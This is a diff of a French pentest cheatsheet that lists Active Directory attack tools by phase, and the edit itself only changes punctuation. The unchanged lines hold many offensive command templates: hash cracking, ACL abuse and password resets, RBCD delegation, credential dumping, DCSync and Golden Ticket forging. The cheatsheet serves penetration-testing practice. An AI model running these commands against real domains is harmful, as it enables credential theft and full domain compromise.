@@ -1,4 +1,4 @@
-# Cheatsheet — Outils par usage et phase
+# Cheatsheet : Outils par usage et phase
 
 ---
 
@@ -14,7 +14,7 @@
 | **hashcat** | Crack de hashes offline | Accès initial / Escalade | `hashcat -m 5600 hash.txt rockyou.txt` |
 | **john** | Crack de hashes (alternative) | Accès initial / Escalade | `john --format=netntlmv2 hash.txt --wordlist=rockyou.txt` |
 | **bloodhound-python** | Collecte BloodHound | Énumération | `bloodhound-python -u $USER -p $PWD -d $DOMAIN -c All` |
-| **BloodHound** | Graphe chemins vers DA | Énumération | GUI — importer le .zip |
+| **BloodHound** | Graphe chemins vers DA | Énumération | GUI : importer le .zip |
 | **nxc / netexec** | Couteau suisse SMB/LDAP/WinRM | Toutes phases | `nxc smb $RANGE -u $USER -p $PWD -d $DOMAIN` |
 | **ldapdomaindump** | Dump LDAP complet | Énumération | `ldapdomaindump -u "$DOMAIN\\$USER" -p $PWD $DC_IP` |
 | **enum4linux-ng** | Énumération complète | Énumération | `enum4linux-ng -a $DC_IP` |
@@ -23,7 +23,7 @@
 | **GetNPUsers** | AS-REP Roasting | Escalade | `GetNPUsers.py $DOMAIN/ -no-pass -usersfile users.txt -dc-ip $DC_IP` |
 | **bloodyAD** | Abus ACL (GenericAll/WriteDACL) | Escalade | `bloodyAD -u $USER -p $PWD -d $DOMAIN --dc-ip $DC_IP set password $TARGET 'Pass!'` |
 | **targetedKerberoast** | Kerberoasting ciblé via GenericWrite | Escalade | `targetedKerberoast.py -d $DOMAIN -u $USER -p $PWD` |
-| **certipy** | ADCS — audit et exploitation | Escalade | `certipy find -u $USER@$DOMAIN -p $PWD -dc-ip $DC_IP -vulnerable` |
+| **certipy** | ADCS : audit et exploitation | Escalade | `certipy find -u $USER@$DOMAIN -p $PWD -dc-ip $DC_IP -vulnerable` |
 | **addcomputer.py** | Créer compte machine (RBCD) | Escalade | `addcomputer.py -computer-name 'EVIL$' -computer-pass 'Pass!' ...` |
 | **rbcd.py** | Configurer RBCD | Escalade | `rbcd.py -delegate-from 'EVIL$' -delegate-to 'TARGET$' ...` |
 | **getST.py** | S4U2proxy (délégation) | Escalade | `getST.py -spn 'cifs/target' -impersonate Administrator ...` |
@@ -44,17 +44,17 @@
 
 ## Par phase d'attaque
 
-### Phase 0 — Setup
-- `ip a`, `ip route` — réseau
-- `/etc/hosts`, `/etc/resolv.conf` — DNS
+### Phase 0 : Setup
+- `ip a`, `ip route` : réseau
+- `/etc/hosts`, `/etc/resolv.conf` : DNS
 
-### Phase 1 — Reconnaissance
+### Phase 1 : Reconnaissance
 - `nmap` → scanner le réseau
 - `nxc smb $RANGE` → découverte hôtes
 - `responder -A` → écoute passive
 - `dig axfr` → zone DNS
 
-### Phase 2 — Accès Initial
+### Phase 2 : Accès Initial
 - `responder` → capture NTLMv2
 - `ntlmrelayx` → relay NTLM
 - `mitm6` → DHCPv6 MiTM
@@ -63,7 +63,7 @@
 - `hashcat -m 5600` → cracker NTLMv2
 - `hashcat -m 18200` → cracker AS-REP
 
-### Phase 3 — Énumération
+### Phase 3 : Énumération
 - `bloodhound-python` → collecte BloodHound
 - `nxc smb` → shares, users, groups
 - `ldapdomaindump` → dump LDAP
@@ -71,28 +71,28 @@
 - `gpp-decrypt` → décrypter cpassword
 - `certipy find` → ADCS vulnérable
 
-### Phase 4 — Escalade
+### Phase 4 : Escalade
 - `GetUserSPNs.py` + `hashcat -m 13100` → Kerberoasting
 - `GetNPUsers.py` + `hashcat -m 18200` → AS-REP Roasting
 - `bloodyAD` → abus ACL
 - `certipy req/auth` → ADCS ESC1
 - `addcomputer + rbcd + getST` → RBCD
 
-### Phase 5 — Mouvement latéral
+### Phase 5 : Mouvement latéral
 - `nxc smb -H $HASH` → PtH spray
 - `psexec.py / wmiexec.py / evil-winrm` → shell
 - `nxc --sam --lsa --ntds` → dump credentials
 - `secretsdump.py` → dump complet
 - `getTGT.py` → PtT
 
-### Phase 6 — Compromission
+### Phase 6 : Compromission
 - `secretsdump.py -just-dc-ntlm` → DCSync
 - `ticketer.py` → Golden Ticket
 - `psexec.py -k -no-pass` → utiliser ticket
 
 ---
 
-## Rappel — Formats d'authentification Impacket/nxc
+## Rappel : Formats d'authentification Impacket/nxc
 
 ```bash
 # Mot de passe en clair
